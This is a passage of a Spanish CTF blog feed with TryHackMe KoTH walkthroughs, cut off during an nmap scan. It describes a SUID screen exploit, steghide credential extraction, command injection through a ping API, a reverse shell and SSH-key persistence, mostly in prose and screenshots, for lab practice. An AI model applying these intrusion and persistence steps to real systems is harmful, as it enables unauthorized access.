&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_230024.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion en la maquina y encontramos un archivo &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/&#34;&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/a&gt; &lt;a href=&#34;https://www.exploit-db.com/exploits/41154&#34;&gt;&lt;strong&gt;screen-4.5.0&lt;/strong&gt;&lt;/a&gt;. Ejecutamos el exploit y obtenemos una shell como usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_230910.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una flag en la carpeta principal de este usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_231026.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos la flag en el directorio &lt;code&gt;/&lt;/code&gt; y logramos encontrar una en &lt;code&gt;/home/bread/flag&lt;/code&gt;, &lt;code&gt;/home/tryhackme/flag7&lt;/code&gt; y &lt;code&gt;/var/flag.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_231833.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos otra dentro de la carpeta principal del usuario food (&lt;code&gt;/home/food/.flag&lt;/code&gt;).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_232100.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos los puertos abiertos y nos muestra el puerto &lt;code&gt;16109&lt;/code&gt;, visitamos el puerto y vemos una imagen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200715_001719.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen y extraemos archivos ocultos con &lt;code&gt;steghide&lt;/code&gt; sin contraseña, donde encontramos las credenciales del usuario pasta.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/kothfood# steghide extract -sf image.jpg 
Enter passphrase: 
wrote extracted data to &amp;quot;creds.txt&amp;quot;.
root@upset:~/thm/kothfood# cat creds.txt 
pasta:... snip ...
root@upset:~/thm/kothfood#
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;segunda-parte&#34;&gt;Segunda Parte&lt;/h2&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 15065.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_232853.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothfood# gobuster dir -u http://kothfood.thm:15065/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/monitor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la pagina &lt;code&gt;monitor&lt;/code&gt; en donde al pasarle una ip realiza un ping.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_233307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos nuestra IP y logramos recibir los paquetes.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_233503.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos el codigo fuente de la pagina y encontramos un archivo de javascript, que, en uno de los comentarios indica que el codigo está ofuscado. Encontramos una funcion que envia la IP a una API.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;nx&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pingHost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x25c165&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#outputSection&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x2e78af&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x2e78af&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ValidateIPaddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;_0x25c165&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\x0a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x27c227&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/api/cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ping -c 4 &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1185f3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;_0x25c165&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;textContent&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x27c227&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;_0x25c165&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4d67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Enviamos un comando mediante el metodo POST utilizando &lt;code&gt;CURL&lt;/code&gt; y logramos obtener el resultado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_235205.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shel inversa y logramos obtener una shell inversa con el usuario BREAD.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_235459.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Generamos claves SSH para el usuario bread.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200714_235933.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además agregamos nuestra clave en el archivo &lt;code&gt;authorized_keys&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200715_000128.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos por el servicio ssh y enumeramos la maquina para buscar archivos para escalar privilegios.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-rwsr-xr-x 1 root   root            8.3K Jul 15 05:07 /tmp/rootshell
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            1.6M Mar 20 03:04 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root   root            146K Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root   root            2.6M Jun  6  2019 /usr/bin/vim.basic
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   telnetd          11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Encontramos un binario que al ejecutarlo &lt;code&gt;/tmp/rootshell&lt;/code&gt; nos devuelve una shell como usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/Screenshot_20200715_000452.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/kothfood/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/kothfood/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - KoTH Hackers</title>
        <link>https://sckull.github.io/posts/kothhacker/</link>
        <pubDate>Thu, 09 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 09 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/kothhacker/</guid>
        <description>KoTH Hackers es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;KoTH Hackers es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;KoTH Hackers&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;May 2020 rotation KoTH box&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm&lt;/span&gt;
Warning: 10.10.130.16 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kothhacker.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.130.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65488&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;43&lt;/span&gt; filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
9999/tcp open  abyss?
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7/10%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5F08E4C8%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ge
SF:tRequest,75,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Fri,\x2010\x20Jul\x2020
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x2021:59:36\x20GMT\r\nContent-Length:\x201\r\nContent-Type:\x20text/
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:plain;\x20charset=utf-8\r\n\r\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTPOptions,75,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20200\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20OK\r\nDate:\x20Fri,\x2010\x20Jul\x202020\x2021:59:36\x20GMT\r\nConte
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:nt-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FourOhFourRequest,75,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Fri,\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:2010\x20Jul\x202020\x2021:59:37\x20GMT\r\nContent-Length:\x201\r\nConte
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GenericLines,67,
SF:&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
SF:RTSPRequest,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Help,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
